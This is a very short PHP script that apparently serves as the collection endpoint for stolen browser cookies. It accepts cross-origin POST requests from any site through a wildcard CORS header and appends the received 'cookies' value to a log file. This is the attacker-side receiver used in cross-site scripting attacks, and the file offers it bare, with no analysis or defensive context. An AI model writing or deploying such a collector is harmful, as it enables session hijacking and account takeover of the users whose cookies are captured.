<?php
 header("Access-Control-Allow-Origin: *");
$cookies = $_POST["cookies"];
$myfile = file_put_contents('logs.txt', $cookies.PHP_EOL , FILE_APPEND | LOCK_EX);
?>